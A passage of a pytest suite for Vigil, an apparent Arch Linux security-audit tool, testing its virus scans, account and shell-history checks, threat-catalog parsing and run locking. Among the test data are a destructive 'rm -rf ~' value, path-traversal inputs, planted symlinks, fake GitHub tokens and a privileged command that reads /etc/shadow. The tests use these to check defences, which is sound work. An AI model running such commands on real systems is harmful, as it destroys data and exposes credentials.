    clamscan_ok(v, os.path.join(v.HOME, "x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n", 1)
    msg = v.refresh_due_feeds(full=True)["message"]
    assert msg.startswith("Checked your packages against the Arch security list and scanned your home folder.")
    assert "On this machine: updating would fix 2 known vulnerabilities; 1 infected file in your home folder." in msg
    assert v.run_fix("arch-audit-refresh")["message"] == (
        "Checked your packages against the newest Arch security list. Updating would fix 2 known "
        "vulnerabilities on this machine.")


def test_cli_refresh_feeds_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["refresh-feeds", "--all"], ["refresh-feeds", "--force", "x"], ["refresh-feeds", "--sources"],
                 ["refresh-feeds", "--signatures"], ["refresh-feeds", "--scan", "--signatures"],
                 ["refresh-feeds", "--daily", "--signatures", "--signatures"], ["refresh-feeds", "--daily", "--signatures"],
                 ["refresh-feeds", "--weekly", "--signatures"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# When each scan last ran and each source last updated, shown on the Overview

def test_last_run_list_by_run_with_times(v):
    assert [s["id"] for s in v.source_status()] == ["password-check"]       # always offered
    v.TRUSTED |= {v.ROOT + "/usr/bin/clamscan", v.ROOT + "/usr/bin/arch-audit"}
    got = [(s["id"], s["label"], s["run"], s["state"]) for s in v.source_status()]
    # Each scan and lookup, in the order its run does it: no rows for the lists
    # themselves, since every scan gets its list right before it runs.
    assert got == [("arch-audit", "Arch security scan", "daily", "never"),
                   ("downloads-scan", "Virus scan of ~/Downloads", "daily", "never"),
                   ("virus-scan", "Virus scan of ~", "weekly", "never"),
                   ("password-check", "Password scan", "all", "never")]
    assert all(len(s["label"]) <= 40 and s["note"] == "" for s in v.source_status())   # the panel's limit
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    src = {s["id"]: s for s in v.source_status()}["arch-audit"]
    assert src["state"] == "ok" and re.fullmatch(r"\d{2}:\d{2}", src["time"])


def test_source_failed_and_stale(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    put(d / "arch-audit.json", json.dumps({"at": "2026-01-01", "time": "09:00", "attempted": "2026-01-05"}), 0o600)
    s = {x["id"]: x for x in v.source_status()}["arch-audit"]
    assert s["state"] == "failed" and s["date"] == "2026-01-01" and s["tried"] == "2026-01-05"
    put(d / "arch-audit.json", json.dumps({"at": "2026-01-01", "time": "09:00", "attempted": "2026-01-01"}), 0o600)
    assert {x["id"]: x for x in v.source_status()}["arch-audit"]["state"] == "stale"


def test_a_scan_that_used_old_signatures_says_so(v, monkeypatch):
    clamscan_ok(v)
    fresh_signatures(v, hours_old=72)                                     # ClamAV's update service is off
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 1)
    res = v.refresh_due_feeds(weekly_only=True)
    assert "The virus signatures are 3 days old" in res["message"] and "used them as they were" in res["message"]
    row = {s["id"]: s for s in v.source_status()}["virus-scan"]
    assert row["note"].startswith("with signatures from ") and row["old"] is True      # red in the panel
    assert ", with signatures from " in v.check_virus_scan()["summary"]
    # Current signatures: the Last run line still says which ones it used, but
    # not in red, and the row does not mention them.
    fresh_signatures(v)
    v.refresh_due_feeds(weekly_only=True)
    row = {s["id"]: s for s in v.source_status()}["virus-scan"]
    assert row["note"] == "with signatures from " + time.strftime("%b %-d") and row["old"] is False
    assert "with signatures from" not in v.check_virus_scan()["summary"]
    # Judged when the scan ran, not now: a week-old scan with fresh signatures stays black.
    meta = Path(v.home_path(*v.STATE_DIR, "virus-scan.json"))
    data = json.loads(meta.read_text())
    data["at"] = data["used"][0] = time.strftime("%Y-%m-%d", time.localtime(time.time() - 7 * 86400))
    meta.write_text(json.dumps(data))
    assert {s["id"]: s for s in v.source_status()}["virus-scan"]["old"] is False


def test_no_signatures_means_no_virus_scan(v, monkeypatch):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    v.COMMANDS[scan_argv(v)] = (0, "")
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 1)
    res = v.refresh_due_feeds(weekly_only=True)
    assert "The virus scan could not run: ClamAV has no virus signatures yet." in res["message"]
    assert v.feed_cache("virus-scan") is None and v.feed_due("full-scan") is False   # tried: again tomorrow


def test_warnings_cost_less_than_failures(v):
    warn = v.result("a", "harden", "A", "warn", "x", weight=3)
    fail = v.result("b", "harden", "B", "fail", "x", weight=3)
    assert v.score_of([warn]) == 94 and v.score_of([fail]) == 70


# --------------------------------------------------------------------------
# Accounts, shell history and old network services (Vigil's own; Lynis is retired)

PASSWD = """root:x:0:0::/root:/usr/bin/bash
bin:x:1:1::/:/usr/bin/nologin
marc:x:1000:1000::/home/marc:/usr/bin/bash
"""


def test_accounts_clean(v):
    sysfile(v, "/etc/passwd", PASSWD)
    c = v.check_accounts()
    assert c["status"] == "pass" and "Run all also checks" in c["summary"]
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "", 0o600)
    assert v.check_accounts()["summary"] == "No extra root accounts, shared IDs or accounts without a password."


def test_accounts_findings(v):
    sysfile(v, "/etc/passwd", PASSWD + "toor:x:0:0::/root:/usr/bin/bash\ntwin:x:1000:1000::/home/t:/bin/sh\n")
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "marc\nnot-a-user\n../../x\n", 0o600)
    c = v.check_accounts()
    assert c["status"] == "fail"
    assert c["summary"] == ("Another account has root's powers, 1 account has no password and some accounts "
                            "share one ID.")
    assert "Root powers: toor" in c["detail"] and "No password: marc" in c["detail"]
    assert "Same ID: marc, twin" in c["detail"] and "not-a-user" not in c["detail"]
    assert "sudo passwd -l" in c["howto"]
    sysfile(v, "/etc/passwd", PASSWD + "twin:x:1000:1000::/home/t:/bin/sh\n")
    put(Path(v.HOME, ".local/state/omarchy-vigil/no-password.txt"), "", 0o600)
    assert v.check_accounts()["status"] == "warn"


def test_accounts_password_list_must_be_ours(v, tmp_path):
    sysfile(v, "/etc/passwd", PASSWD)
    planted = put(tmp_path / "planted", "marc\n")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(planted, d / "no-password.txt")
    assert v.no_password_scan() == ("", None)
    assert v.check_accounts()["status"] == "pass"


def test_shell_history(v):
    assert v.check_shell_history()["status"] == "pass"
    put(Path(v.HOME, ".bash_history"), "ls\n")
    assert v.check_shell_history()["status"] == "pass"
    os.symlink("/dev/null", Path(v.HOME, ".zsh_history"))
    c = v.check_shell_history()
    assert c["status"] == "warn" and "~/.zsh_history is a link" in c["detail"] and c["howto"]


def test_old_services(v):
    assert v.check_old_services()["status"] == "pass"
    v.UNITS[("is-enabled", "telnet.socket")] = "enabled"
    v.UNITS[("is-active", "tftpd.service")] = "active"
    c = v.check_old_services()
    assert c["status"] == "warn" and c["summary"] == "telnet.socket and tftpd.service switched on."
    assert c["fix"] == {"kind": "terminal", "action": "old-services-off", "label": "Switch them off"}


def test_old_services_list_matches_the_switch_off_script(v):
    m = re.search(r"var OLD_SERVICES = \[(.*?)\]", (REPO / "Model.js").read_text(), re.S)
    assert tuple(re.findall(r'"([a-z.-]+)"', m.group(1))) == v.OLD_SERVICES


def test_result_messages_are_never_cut_short(v):
    # The panel shows a result message whole: both sides allow the same length,
    # and a long check result fits in it.
    m = re.search(r"var MAX_MESSAGE = (\d+)", (REPO / "Model.js").read_text())
    assert int(m.group(1)) == v.MESSAGE_MAX
    assert "…" not in v.clean("x" * 1500, v.MESSAGE_MAX)


def test_restart_needed(v, monkeypatch):
    monkeypatch.setattr(v, "_running_kernel", lambda: "6.18.44-arch1-1")
    assert v.check_restart()["status"] == "na"
    Path(v.sys_path("/usr/lib/modules/6.18.44-arch1-1")).mkdir(parents=True)
    assert v.check_restart()["status"] == "pass"
    monkeypatch.setattr(v, "_running_kernel", lambda: "6.18.40-arch1-1")
    c = v.check_restart()
    assert c["status"] == "warn" and c["fix"]["action"] == "restart"
    monkeypatch.setattr(v, "_running_kernel", lambda: "../../etc")
    assert v.check_restart()["status"] == "na"


# --------------------------------------------------------------------------
# Rarely used protocols and FireWire (Vigil's answers to Lynis NETW-3200 and STRG-1846)

def test_rare_protocols_only_shown_to_undo_an_earlier_change(v):
    assert v.check_rare_protocols() is None
    assert "rare-protocols" not in [c["id"] for c in v.audit(peek=True)["checks"]]
    sysfile(v, "/etc/modprobe.d/90-omarchy-vigil-protocols.conf", v.ETC_MARK + "\ninstall dccp /bin/false\n")
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}["rare-protocols"]
    assert c["status"] == "pass" and c["undo"]["action"] == "undo-protocols"


def test_firewire_only_matters_with_a_port(v):
    assert v.check_firewire()["summary"] == "This machine has no FireWire port."
    sysfile(v, "/sys/bus/pci/devices/0000:00:1f.0/class", "0x060100\n")
    sysfile(v, "/sys/bus/pci/devices/0000:03:00.0/class", "0x0c0010\n")
    c = v.check_firewire()
    assert c["status"] == "info" and c["fix"]["action"] == "firewire-off"
    sysfile(v, "/etc/modprobe.d/90-omarchy-vigil-firewire.conf",
            v.ETC_MARK + "\ninstall firewire-core /bin/false\n")
    assert v.check_firewire()["status"] == "pass" and v.undo_available("undo-firewire")


# --------------------------------------------------------------------------
# Run all: the whole home folder, Bumblebee, and the next automatic update

def test_password_check_uses_omarchys_password_dialog(v):
    sysfile(v, "/etc/passwd", PASSWD + "ghost:x:1001:1001::/home/g:/bin/sh\n")
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/bash"}
    assert v.NO_PASSWORD_ARGV[:3] == ["/usr/bin/pkexec", "/usr/bin/bash", "-c"]
    assert v.NO_PASSWORD_ARGV[3] == "/usr/bin/awk -F: '$2 == \"\" { print $1 }' /etc/shadow"
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (0, "ghost\n../evil\n")
    res = v.refresh_due_feeds(full=True)
    assert res["message"].startswith("Checked for accounts without a password.")
    assert v.no_password_scan()[1] == ["ghost"]
    c = v.check_accounts()
    assert c["status"] == "fail" and "No password: ghost" in c["detail"]
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (126, "")                     # dialog cancelled
    res = v.refresh_due_feeds(full=True)
    assert "The password scan was skipped" in res["message"] and "tries again" not in res["message"]
    assert v.no_password_scan()[1] == ["ghost"]                           # last result kept


def test_weekly_run_never_asks_for_a_password(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/bash"}
    v.COMMANDS[tuple(v.NO_PASSWORD_ARGV)] = (0, "")
    v.refresh_due_feeds()
    assert v.no_password_scan() == ("", None)


def test_full_scan_says_when_the_password_check_cannot_run(v):
    res = v.refresh_due_feeds(full=True)                                  # no pkexec here
    assert res["message"].endswith("The password scan could not run: pkexec is missing.")


def test_remove_secret_lines(v):
    bash = put(Path(v.HOME, ".bash_history"), "ls\nexport GITHUB_TOKEN=ghp_" + "a" * 36 + "\ncd /tmp\n", 0o600)
    fish = put(Path(v.HOME, ".local/share/fish/fish_history"),
               "- cmd: echo hi\n  when: 1\n- cmd: curl -H 'Authorization: token ghp_" + "b" * 36 + "'\n  when: 2\n"
               "  paths:\n    - /tmp\n- cmd: ls\n  when: 3\n", 0o600)
    c = {x["id"]: x for x in v.audit(peek=True)["checks"]}["exposed-secrets"]
    assert c["status"] == "warn" and c["fix"]["action"] == "remove-secret-lines"
    res = v.run_fix("remove-secret-lines")
    assert res["ok"] and res["message"].startswith("Removed 2 lines with keys"), res
    assert bash.read_text() == "ls\ncd /tmp\n"
    assert fish.read_text() == "- cmd: echo hi\n  when: 1\n- cmd: ls\n  when: 3\n"
    assert stat.S_IMODE(os.stat(bash).st_mode) == 0o600
    assert {x["id"]: x for x in v.audit(peek=True)["checks"]}["exposed-secrets"]["status"] == "pass"
    assert v.run_fix("remove-secret-lines")["message"] == "No lines with keys were found."


def test_only_run_all_updates_signatures_and_only_after_two_days(v, monkeypatch):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pkexec", v.ROOT + "/usr/bin/bash", v.ROOT + "/usr/bin/freshclam"}
    clamscan_ok(v)
    monkeypatch.setattr(v, "count_home_files", lambda **kw: 1)
    SIG, NOPW = tuple(v.SIGNATURES_ARGV), tuple(v.NO_PASSWORD_ARGV)
    v.COMMANDS[SIG] = (0, "")
    v.COMMANDS[NOPW] = (0, "")
    calls = []
    real = v.run
    v.run = lambda argv, **kw: (calls.append(tuple(argv)), real(argv, **kw))[1]
    # 47 hours: ClamAV's own service is just slow. Nothing forces an update.
    fresh_signatures(v, hours_old=47)
    assert v.audit(peek=True)["signaturesDue"] is False
    v.refresh_due_feeds(full=True, signatures=True)
    assert SIG not in calls
    # 49 hours: the service fell behind. Run all, whose card showed the
    # command, updates them first, then asks for the password scan.
    fresh_signatures(v, hours_old=49)
    assert v.audit(peek=True)["signaturesDue"] is True
    calls.clear()
    res = v.refresh_due_feeds(full=True, signatures=True)
    assert calls[:2] == [SIG, NOPW] and res["message"].startswith("Updated the virus signatures")
    assert "days old" not in res["message"]                               # the scan used the new ones
    # The daily and weekly checks, the background run and Scan now never ask,
    # flag or not: they scan with what is there and say how old it was.
    fresh_signatures(v, hours_old=72)
    calls.clear()
    for kw in ({"daily_only": True, "signatures": True}, {"weekly_only": True, "signatures": True},
               {"scan_only": True}, {}):
        res = v.refresh_due_feeds(**kw)
    assert not [c for c in calls if c[0] == "/usr/bin/pkexec"]
    assert "3 days old" in v.refresh_due_feeds(weekly_only=True)["message"]
    # A Run all card that did not show the command never leads to that prompt.
    v.refresh_due_feeds(full=True)
    assert SIG not in calls
    # Password dialog dismissed: said once, and the scan still runs.
    v.COMMANDS[SIG] = (126, "")
    res = v.refresh_due_feeds(full=True, signatures=True)
    assert "virus signatures were not updated: no password was given" in res["message"]
    assert "scanned your home folder" in res["message"]


def test_clamui_activity_counts_in_the_last_run_list(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    idx = {"version": 1, "entries": [
        {"id": "a", "timestamp": "2026-10-10T09:00:00.1", "type": "scan"},
        {"id": "b", "timestamp": "2026-10-11T21:30:00.5", "type": "scan"},
        {"id": "c", "timestamp": "2026-10-11T08:15:00", "type": "update"},
        {"id": "d", "timestamp": "<b>bad</b>", "type": "scan"}]}
    put(Path(v.HOME, ".var/app/io.github.linx_systems.ClamUI/data/clamui/logs/log_index.json"), json.dumps(idx))
    assert v.clamui_last("scan") == ("2026-10-11", "21:30")
    assert v.clamui_last("update") == ("2026-10-11", "08:15")
    src = {s["id"]: s for s in v.source_status()}
    assert src["virus-scan"]["date"] == "2026-10-11" and src["virus-scan"]["by"] == "ClamUI"
    assert v.signatures_updated() == ("2026-10-11", "08:15")             # ClamUI's update counts
    fresh_signatures(v)                                                   # ClamAV's own check, just now
    assert v.signatures_updated()[0] == time.strftime("%Y-%m-%d")


def test_signature_update_wakes_clamavs_service_and_explains_failures(v):
    script = v.SIGNATURES_SCRIPT
    assert "systemctl kill --signal=SIGUSR1 --kill-whom=main clamav-freshclam.service" in script
    assert "journalctl -u clamav-freshclam.service" in script and "/usr/bin/freshclam" in script
    assert v.SIGNATURES_ARGV == [v.PKEXEC, "/usr/bin/bash", "-c", script]
    v.COMMANDS[tuple(v.SIGNATURES_ARGV)] = (3, "")
    with pytest.raises(v.Refused, match="did not finish checking within two minutes"):
        v.refresh_signatures()
    v.COMMANDS[tuple(v.SIGNATURES_ARGV)] = (0, "")
    assert v.refresh_signatures() == "Virus signatures updated."
    assert v.signatures_updated()[0] == time.strftime("%Y-%m-%d")         # Vigil's own record


def test_missing_helpers_listed_in_order(v):
    assert v.missing_helpers() == ["clamav", "arch-audit", "osv-scanner", "fwupd", "clamui", "bumblebee"]
    v.TRUSTED |= {v.ROOT + "/usr/bin/clamscan", v.ROOT + "/usr/bin/freshclam", v.ROOT + "/usr/bin/arch-audit",
                  v.ROOT + "/usr/bin/fwupdmgr"}
    assert v.missing_helpers() == ["osv-scanner", "clamui", "bumblebee"]
    assert v.audit(peek=True)["missing"] == ["osv-scanner", "clamui", "bumblebee"]


# --------------------------------------------------------------------------
# Bumblebee by Perplexity

import gzip as _gzip
import tarfile as _tarfile
import io as _io


def tarball(files):
    buf = _io.BytesIO()
    with _tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for name, body in files.items():
            data = body.encode() if isinstance(body, str) else body
            info = _tarfile.TarInfo(name)
            info.size = len(data)
            tf.addfile(info, _io.BytesIO(data))
    return buf.getvalue()


CAT_A = json.dumps({"schema_version": "0.2.0", "entries": [
    {"id": "a", "name": "evil 1.0", "ecosystem": "npm", "package": "evil", "versions": ["1.0.0"]}]})
CAT_B = json.dumps({"schema_version": "0.2.0", "entries": [
    {"id": "b", "name": "bad 2", "ecosystem": "pypi", "package": "bad", "versions": ["2"]}, "junk"]})


def bumblebee_installed(v):
    v.TRUSTED |= {v.ROOT + "/usr/local/bin/bumblebee", v.ROOT + "/usr/bin/curl"}


def test_catalog_reads_only_threat_intel_json(v):
    old = json.dumps({"schema_version": "0.1.0", "entries": [
        {"id": "c", "ecosystem": "go", "package": "x/y", "versions": ["v1.0.0"]},
        {"id": "a", "ecosystem": "npm", "package": "dup", "versions": ["9"]}]})
    future = json.dumps({"schema_version": "9.0.0", "entries": [
        {"id": "f", "ecosystem": "npm", "package": "f", "versions": ["1"]}]})
    data = tarball({"bumblebee-main/threat_intel/a.json": CAT_A, "bumblebee-main/threat_intel/b.json": CAT_B,
                    "bumblebee-main/threat_intel/README.md": "x", "bumblebee-main/cmd/x.json": CAT_A,
                    "bumblebee-main/threat_intel/old.json": old, "bumblebee-main/threat_intel/future.json": future,
                    "bumblebee-main/threat_intel/bad.json": "{not json"})
    cat = v.catalog_from_tarball(data)
    # Written as 0.1.0, which every Bumblebee release reads; 0.1.0 and 0.2.0 lists merged,
    # unknown schemas left out, the first of two entries with one id kept.
    assert cat["schema_version"] == "0.1.0"
    assert sorted(e["id"] for e in cat["entries"]) == ["a", "b", "c"]
    assert [e["package"] for e in cat["entries"] if e["id"] == "a"] == ["evil"]
    assert v.catalog_from_tarball(b"garbage") is None
    assert v.catalog_from_tarball(tarball({"x/README.md": "x"})) is None


def test_catalog_entries_bumblebee_would_refuse_are_dropped(v):
    good = {"id": "g", "ecosystem": "npm", "package": "p", "versions": ["1.0.0"], "severity": "critical",
            "name": "p 1.0.0", "source": "https://example.org", "indicators": [{"x": 1}], "references": ["r"]}
    assert v.catalog_entry(good) == {"id": "g", "ecosystem": "npm", "package": "p", "versions": ["1.0.0"],
                                     "name": "p 1.0.0", "severity": "critical", "source": "https://example.org"}
    for bad in ({"versions": ["*"]}, {"versions": []}, {"versions": "1.0.0"}, {"versions": ["1", 2]},
                {"versions": [""]}, {"id": ""}, {"package": None}, {"ecosystem": "npm\n"}, {"id": " g"},
                {"versions": ["1"] * 2001}):
        assert v.catalog_entry(dict(good, **bad)) is None, bad


def test_bumblebee_list_and_scan(v):
    bumblebee_installed(v)
    url_call = ("/usr/bin/curl", "-q", "-sS", "--fail", "--proto", "=https", "--proto-redir", "=https",
                "--max-time", "60", "--max-filesize", "33554432", "--", v.BUMBLEBEE_CATALOG_URL)
    data = tarball({"bumblebee-main/threat_intel/a.json": CAT_A})
    real = v.run
    v.run = lambda argv, **kw: (0, data) if tuple(argv) == url_call else real(argv, **kw)
    assert v.refresh_bumblebee_list().startswith("Bumblebee list updated (1 known")
    catalog = Path(v.HOME, ".local/state/omarchy-vigil", v.BUMBLEBEE_CATALOG)
    assert json.loads(catalog.read_text())["entries"][0]["id"] == "a"
    scan = ("/usr/local/bin/bumblebee", "scan", "--profile", "baseline", "--exposure-catalog", str(catalog),
            "--findings-only", "--output", "stdout", "--max-duration", "5m")
    finding = {"record_type": "finding", "catalog_name": "evil 1.0 (compromised)", "ecosystem": "npm",
               "package_name": "evil", "version": "1.0.0", "source_file": "/home/x/p/package-lock.json",
               "severity": "critical"}
    v.COMMANDS[scan] = (0, json.dumps(finding) + "\n" + json.dumps({"record_type": "scan_summary",
                                                                    "status": "complete"}) + "\n")
    assert v.refresh_bumblebee() == "Bumblebee scanned."
    c = v.check_bumblebee()
    assert c["status"] == "fail" and "evil 1.0 (compromised): npm evil 1.0.0 in /home/x/p/package-lock.json" in c["detail"]
    v.COMMANDS[scan] = (0, json.dumps({"record_type": "scan_summary", "status": "complete"}) + "\n")
    v.refresh_bumblebee()
    assert v.check_bumblebee()["status"] == "pass"
    v.COMMANDS[scan] = (1, json.dumps({"record_type": "scan_summary", "status": "error"}) + "\n")
    with pytest.raises(v.Refused):
        v.refresh_bumblebee()
    assert v.check_bumblebee()["status"] == "pass"                       # the last good result stays


def test_bumblebee_states_and_install(v):
    c = v.check_bumblebee()
    assert c["status"] == "info" and c["fix"]["action"] == "install-helpers"
    bumblebee_installed(v)
    c = v.check_bumblebee()
    assert c["status"] == "info" and "next daily check" in c["summary"]
    with pytest.raises(v.Refused):
        v.refresh_bumblebee()                                             # no list downloaded yet


def test_full_scan_runs_bumblebee_before_the_long_virus_scan(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    bumblebee_installed(v)
    monkeypatch.setattr(v, "refresh_bumblebee", lambda: "ok")
    monkeypatch.setattr(v, "refresh_bumblebee_list", lambda: v.save_feed("bumblebee-list", {}))
    v.FEED_REFRESH["bumblebee-list"] = v.refresh_bumblebee_list
    clamscan_ok(v)
    v.refresh_due_feeds(full=True)
    steps = [json.loads(l)["progress"]["doing"] for l in capsys.readouterr().out.splitlines() if '"progress"' in l]
    assert steps.index("Bumblebee scan") < steps.index("Virus scan of ~")
    assert steps[-1] == "Virus scan of ~"


# --------------------------------------------------------------------------
# One scan or update at a time

import fcntl as _fcntl


def hold_lock_elsewhere(v):
    """Another Vigil run, as the kernel sees it: its own open of the busy folder, locked."""
    busy = Path(v.HOME, ".local/state/omarchy-vigil/busy")
    busy.mkdir(parents=True, exist_ok=True)
    fd = os.open(busy, os.O_RDONLY | os.O_DIRECTORY)
    _fcntl.flock(fd, _fcntl.LOCK_EX | _fcntl.LOCK_NB)
    return fd


def test_only_one_run_at_a_time(v, capsys, monkeypatch):
    calls = []
    monkeypatch.setattr(v, "refresh_due_feeds", lambda **kw: calls.append(kw) or {"ok": True, "action": "", "message": "x"})
    monkeypatch.setattr(v.time, "sleep", lambda s: None)
    fd = hold_lock_elsewhere(v)
    try:
        assert v.main(["vigil", "refresh-feeds", "--full"]) == 0
        out = json.loads(capsys.readouterr().out.strip().splitlines()[-1])
        assert out["busy"] is True and "already running" in out["message"] and calls == []
    finally:
        os.close(fd)                          # the other run ends: the kernel drops its lock
    assert v.main(["vigil", "refresh-feeds", "--full"]) == 0
    assert calls == [{"force": False, "full": True, "scan_only": False, "daily_only": False, "weekly_only": False,
                      "signatures": False}]
    os.close(v.RUN_LOCK["fd"])
    v.RUN_LOCK["fd"] = None


def test_a_run_started_elsewhere_shows_in_the_report(v):
    assert v.run_in_progress() is None
    fd = hold_lock_elsewhere(v)
    try:
        assert v.run_in_progress() == {"step": 0, "of": 0, "doing": "", "done": 0, "total": 0}
        put(Path(v.HOME, ".local/state/omarchy-vigil/progress.json"), json.dumps({"progress": {
            "step": 2, "of": 3, "doing": "Virus scan of ~", "done": 5, "total": 10}}))
        assert v.run_in_progress()["doing"] == "Virus scan of ~"
        report = v.audit(peek=True)
        assert report["running"]["step"] == 2 and report["feedsDue"] is False
        for bad in ({"doing": "rm -rf ~"}, {"step": 4}, {"step": True}, {"done": -1}, {"of": 99, "step": 50}):
            body = dict({"step": 2, "of": 3, "doing": "Virus scan of ~", "done": 5, "total": 10}, **bad)
            put(Path(v.HOME, ".local/state/omarchy-vigil/progress.json"), json.dumps({"progress": body}))
            assert v.run_in_progress()["step"] == 0, bad
    finally:
        os.close(fd)
    assert v.run_in_progress() is None                 # a stale progress file means nothing on its own


def test_programs_a_run_starts_keep_the_lock(tmp_path):
    mod = load_vigil()
    mod.HOME = str(tmp_path)
    os.chmod(tmp_path, 0o700)
    assert mod.take_run_lock()
    fd = mod.RUN_LOCK["fd"]
    try:
        rc, out = mod.run(["/bin/sh", "-c", "ls /proc/self/fd"])
        assert rc == 0 and str(fd) in out.split()
    finally:
        os.close(fd)


def test_progress_goes_to_a_file_while_the_lock_is_held(v, monkeypatch):
    v.RUN_LOCK["fd"] = 99999                           # held (never used as a real descriptor here)
    v.progress(1, 2, "AUR package status")
    p = json.loads(Path(v.HOME, ".local/state/omarchy-vigil/progress.json").read_text())["progress"]
    assert p == {"step": 1, "of": 2, "doing": "AUR package status", "done": 0, "total": 0}
    v.RUN_LOCK["fd"] = None


def test_a_closed_panel_does_not_stop_the_run(v, monkeypatch):
    class Gone:
        def write(self, s): raise BrokenPipeError()
        def flush(self): raise BrokenPipeError()
    monkeypatch.setattr(v.sys, "stdout", Gone())
    v.emit({"x": 1})
    v.emit({"x": 2})                                   # no exception: the run carries on
    assert v.PROGRESS["gone"] is True
    v.PROGRESS.pop("gone")


# --------------------------------------------------------------------------
# Security key or fingerprint

def omarchy_tools(v, *names):
    for n in names:
        v.TRUSTED.add(v.ROOT + "/usr/bin/" + n)


def strong_auth(v):
    return next(c for c in v.audit(peek=True)["checks"] if c["id"] == "strong-auth")


def test_fingerprint_offered_only_where_omarchy_finds_a_reader(v):
    put(Path(v.ROOT, "etc/pam.d/sudo"), "auth include system-auth\n")
    c = strong_auth(v)
    assert c["fix"]["action"] == "fido2" and c["undo"]["action"] == ""      # no detector: FIDO2 as before
    omarchy_tools(v, "omarchy-hw-fingerprint", "omarchy-setup-security-fingerprint")
    v.COMMANDS[("/usr/bin/omarchy-hw-fingerprint",)] = (1, "")
    assert strong_auth(v)["fix"]["action"] == "fido2"                       # no reader
    v.COMMANDS[("/usr/bin/omarchy-hw-fingerprint",)] = (0, "")
    c = strong_auth(v)
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "fingerprint",
                                                  "label": "Set up fingerprint"}
    assert "fingerprint reader" in c["summary"]
    v.COMMANDS[("/usr/bin/omarchy-hw-fingerprint",)] = (None, "")           # timed out: not offered
    assert strong_auth(v)["fix"]["action"] == "fido2"


def test_set_up_methods_offer_omarchys_removal_as_undo(v):
    put(Path(v.ROOT, "etc/pam.d/sudo"), "auth sufficient pam_fprintd.so\nauth include system-auth\n")
    c = strong_auth(v)
    assert c["status"] == "pass" and c["undo"]["action"] == ""                # removal tool missing: no undo
    omarchy_tools(v, "omarchy-remove-security-fingerprint", "omarchy-remove-security-fido2")
    c = strong_auth(v)
    assert c["summary"] == "sudo accepts your fingerprint."
    assert c["undo"] == {"action": "undo-fingerprint", "label": "Stop using your fingerprint"}
    assert "_undo" not in c
    put(Path(v.ROOT, "etc/pam.d/sudo"), "auth sufficient pam_u2f.so cue\nauth include system-auth\n")
    assert strong_auth(v)["undo"] == {"action": "undo-fido2", "label": "Stop using a security key"}


# --------------------------------------------------------------------------
# Stop

def test_stop_skips_the_rest_and_keeps_what_finished(v, monkeypatch):
    clamscan_ok(v)
    bumblebee_installed(v)
    order = []

    def bumblebee():
        order.append("bumblebee")
        v.STOP["on"] = True                       # Stop pressed while Bumblebee runs
        raise v.Refused("it was stopped")
    monkeypatch.setattr(v, "refresh_bumblebee", bumblebee)
    monkeypatch.setattr(v, "refresh_virus_scan", lambda cb: order.append("virus-scan"))
    try:
        out = v.refresh_due_feeds(scan_only=False, full=False, force=True)
    finally:
        v.STOP["on"] = False
    assert "virus-scan" not in order                              # the step after the stop never ran
    assert out["stopped"] is True and out["ok"] is True and out["message"].startswith("Stopped.")
    for name in ("virus-scan", "bumblebee", "full-scan"):
        cache = json.loads(Path(v.HOME, ".local/state/omarchy-vigil", v.FEED_FILES[name]).read_text())
        assert cache["attempted"] and "at" not in cache, name    # tried today: the weekly run waits a day


def test_nothing_new_starts_after_a_stop(tmp_path):
    mod = load_vigil()
    mod.STOP["on"] = True
    assert mod.run(["/bin/true"]) == (None, "")
    assert mod.run(["/bin/true"], raw=True) == (None, b"")


def test_stop_with_nothing_running(v):
    assert v.stop_run() == {"ok": True, "action": "", "message": "Nothing is running."}


def test_process_identity_is_pid_and_start_time(v):
    me = v.proc_start(os.getpid())
    assert isinstance(me, int) and me == v.proc_start(os.getpid())
    for bad in (1, 0, -5, True, "12", None, 2 ** 40):
        assert v.proc_start(bad) is None


STOP_CHILD = r"""
import importlib.util, importlib.machinery, json, signal, sys, time
l = importlib.machinery.SourceFileLoader("vigil", sys.argv[1])
s = importlib.util.spec_from_loader("vigil", l); v = importlib.util.module_from_spec(s); l.exec_module(v)
v.HOME = sys.argv[2]
assert v.take_run_lock()
signal.signal(signal.SIGTERM, v._on_stop)
v.save_run_info()
print("ready", flush=True)
rc, out = v.run(["/usr/bin/sleep", "60"], timeout=120)
print(json.dumps({"rc": rc, "stopped": v.STOP["on"]}), flush=True)
"""


def test_stop_ends_a_real_run_and_its_program(tmp_path):
    import subprocess as sp
    home = tmp_path / "home"
    home.mkdir(mode=0o700)
    script = tmp_path / "child.py"
    script.write_text(STOP_CHILD)
    child = sp.Popen(["/usr/bin/python3", "-I", str(script), str(REPO / "bin" / "vigil"), str(home)],
                     stdout=sp.PIPE, text=True)
    try:
        assert child.stdout.readline().strip() == "ready"
        mod = load_vigil()
        mod.HOME = str(home)
        for _ in range(50):                                 # until the sleep is recorded
            info = mod._state_json(mod.RUN_FILE) or {}
            if info.get("child"):
                break
            time.sleep(0.05)
        sleeper = info["child"]
        assert mod.run_in_progress() is not None
        assert mod.stop_run()["message"] == "Stopped."
